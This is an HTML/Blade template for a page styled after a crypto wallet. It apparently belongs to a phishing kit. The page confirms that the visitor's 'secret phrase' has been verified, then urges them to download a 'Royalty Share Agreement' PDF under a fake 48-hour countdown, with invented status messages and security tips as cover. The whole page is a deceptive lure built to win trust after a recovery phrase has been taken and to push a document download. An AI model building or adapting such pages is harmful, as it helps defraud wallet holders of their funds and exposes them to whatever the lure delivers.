@include('home.header')
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iabstrakt - User Verified</title>

<!-- Bootstrap CSS -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<style>
:root {
    --trust-primary: #3375bb;
    --trust-dark: #0b0f16;
    --trust-card: #141a24;
    --trust-border: #2a3344;
    --trust-text-light: #e2e8f0;
    --trust-text-secondary: #94a3b8;
    --success-color: #10b981;
    --warning-color: #f59e0b;
    --error-color: #ef4444;
}

body {
    background: var(--trust-dark);
    color: var(--trust-text-light);
    font-family: 'Segoe UI', sans-serif;
    padding: 20px;
    min-height: 100vh;
}

.trust-header {
    display: flex;
    justify-content: center;
    margin-bottom: 30px;
}

.trust-logo {
    font-size: 2rem;
    font-weight: 700;
    display: flex;
    align-items: center;
    color: white;
}

.trust-logo::before {
    content: "";
    display: inline-block;
    width: 30px;
    height: 30px;
    background: linear-gradient(135deg, #3375bb, #5ba2ff);
    border-radius: 10px;
    margin-right: 10px;
}

.wallet-card {
    background: var(--trust-card);
    border-radius: 24px;
    padding: 25px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    border: 1px solid var(--trust-border);
    max-width: 500px;
    margin: auto;
    display: flex;
    flex-direction: column;
    align-items: center;
}

.user-header {
    width: 100%;
    display: flex;
    align-items: center;
    margin-bottom: 20px;
    border-bottom: 1px solid var(--trust-border);
    padding-bottom: 10px;
}

.user-title {
    font-size: 20px;
    font-weight: 600;
    margin: 0;
}

.verification-badge {
    margin-left: auto;
    display: flex;
    align-items: center;
    gap: 5px;
    padding: 6px 12px;
    font-size: 14px;
    font-weight: 600;
    border-radius: 20px;
    background-color: rgba(16,185,129,0.2);
    color: var(--success-color);
    border: 1px solid rgba(16,185,129,0.5);
}

.success-message {
    text-align: center;
    padding: 25px 15px;
    background: rgba(16,185,129,0.1);
    border-radius: 16px;
    border: 1px solid rgba(16,185,129,0.3);
    margin-bottom: 20px;
}

.success-message .material-icons {
    font-size: 48px;
    color: var(--success-color);
    margin-bottom: 10px;
}

.security-tips {
    background: rgba(42,51,68,0.7);
    border-radius: 12px;
    padding: 15px;
    width: 100%;
    border-left: 4px solid var(--warning-color);
    margin-bottom: 20px;
}

.security-tips h6 {
    display: flex;
    align-items: center;
    gap: 8px;
    color: var(--warning-color);
    margin-bottom: 10px;
}

.security-tips ul {
    padding-left: 20px;
    font-size: 14px;
    color: var(--trust-text-secondary);
}

.btn-primary, .btn-secondary {
    border-radius: 16px;
    font-weight: 600;
    font-size: 16px;
    padding: 12px 20px;
    width: 100%;
    margin-top: 10px;
}

.btn-primary { background: var(--trust-primary); border: none; color: white; }
.btn-secondary { background: rgba(42,51,68,0.7); border: 1px solid var(--trust-border); color: var(--trust-text-light); }

.modal-content {
    background: var(--trust-card);
    color: var(--trust-text-light);
    border-radius: 16px;
    border: 1px solid var(--trust-border);
}

.modal-header { border-bottom: 1px solid var(--trust-border); }
.modal-footer { border-top: 1px solid var(--trust-border); }

.status-item {
    display: flex;
    align-items: center;
    padding: 12px 0;
    border-bottom: 1px solid rgba(66, 75, 95, 0.3);
}

.status-item:last-child { border-bottom: none; }

.status-icon {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-right: 12px;
    font-size: 18px;
    flex-shrink: 0;
}

.status-success { background-color: var(--success-color); color: white; }
.status-warning { background-color: var(--warning-color); color: white; }
.status-error { background-color: var(--error-color); color: white; }

.status-text a { color: var(--trust-primary); text-decoration: underline; }

.download-doc { display: flex; align-items: center; gap: 6px; color: var(--trust-primary); margin-top: 5px; text-decoration: none; }

.download-doc:hover { text-decoration: underline; }

.status-extra {
    background: rgba(20, 26, 36, 0.85);
    border: 1px solid rgba(66, 75, 95, 0.4);
}


</style>
</head>
<body>

<div class="trust-header">
    <div class="trust-logo">Iabstrakt</div>
</div>

<div class="wallet-card">
    <div class="user-header">
        <h3 class="user-title">User 2 Contributor</h3>
        <div class="verification-badge">
            <span class="material-icons">check_circle</span> Verified
        </div>
    </div>

    <div class="success-message">
        <span class="material-icons">verified_user</span>
        <h4>Secret Phrase Verified</h4>
        <p class="text-secondary">Your secret phrase has been successfully verified. You can now securely access your wallet.</p>
    </div>

    <div class="security-tips">
        <h6><span class="material-icons">security</span> Security Tips</h6>
        <ul>
            <li>Never share your secret phrase with anyone</li>
            <li>Store your phrase in a secure offline location</li>
            <li>Be cautious of phishing attempts</li>
        </ul>
    </div>

    <button type="button" class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#statusModal">
        <i class="material-icons me-2">info</i>View Status Details
    </button>
</div>

<!-- Status Modal -->
<div class="modal fade" id="statusModal" tabindex="-1" aria-labelledby="statusModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered modal-md">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="statusModalLabel"><i class="material-icons me-2">info</i>Status Overview</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        
        <div class="status-item">
            <div class="status-icon status-success"><i class="material-icons">check</i></div>
            <div class="status-text">Executor Keys Verified</div>
        </div>

        <div class="status-item">
            <div class="status-icon status-warning"><i class="material-icons">hourglass_top</i></div>
            <div class="status-text">Awaiting Developer/Contributor ⚠⚠</div>
        </div>

        <div class="status-item">
            <div class="status-icon status-error"><i class="material-icons">build</i></div>
            <div class="status-text">
                Fix/Troubleshooting:
                <ul class="mt-1 ps-3 mb-0">
    <li>
        <a href="{{ asset('Royalty_Share_Agreement_and_obligations2.pdf') }}" 
           class="text-primary" 
           download>
            Review Contract Terms, Signatories & Obligations
        </a>
    </li>

    <li>
        <a href="{{ asset('Royalty_Share_Agreement_and_obligations2.pdf') }}" 
           class="download-doc" 
           download>
            <i class="material-icons">download</i> Download PDF Documentation
        </a>
    </li>
</ul>

            </div>

        </div>

        <!-- Beneath Fix/Troubleshooting -->
<div class="status-extra mt-3 p-3 rounded-3">
    <div class="d-flex align-items-center mb-2">
        <span class="material-icons me-2" style="font-size:22px; color:#ef4444;">timer</span>
        <h6 class="m-0" style="color:#ef4444; font-weight:600;">Countdown Timer</h6>
    </div>

    <p class="mb-1 text-secondary">This link will automatically deactivate in:</p>

    <div id="countdown"
         style="font-size:1.5rem; font-weight:700; color:#ef4444; letter-spacing:1px;">
    </div>

    <div class="mt-3 p-2 rounded-2" style="background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.3);">
        <strong style="color:#ef4444;">⚠ Link Generator Status:</strong>
        <span class="text-secondary">Active Will deactivate when timer reaches 00:00</span>
    </div>
</div>


      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary">Try Again</button>
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
    // Set countdown for 48 hours from now
    let countDownTime = new Date().getTime() + (48 * 60 * 60 * 1000);

    let timer = setInterval(function () {

        let now = new Date().getTime();
        let distance = countDownTime - now;

        let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        let seconds = Math.floor((distance % (1000 * 60)) / 1000);

        document.getElementById("countdown").innerHTML =
            hours + "h " + minutes + "m " + seconds + "s";

        // When finished
        if (distance < 0) {
            clearInterval(timer);
            document.getElementById("countdown").innerHTML = "Link Deactivated";

            // Optionally disable link here
            let links = document.querySelectorAll("a");
            links.forEach(link => {
                link.style.pointerEvents = "none";
                link.style.opacity = "0.5";
            });
        }
    }, 1000);
</script>

</body>
</html>
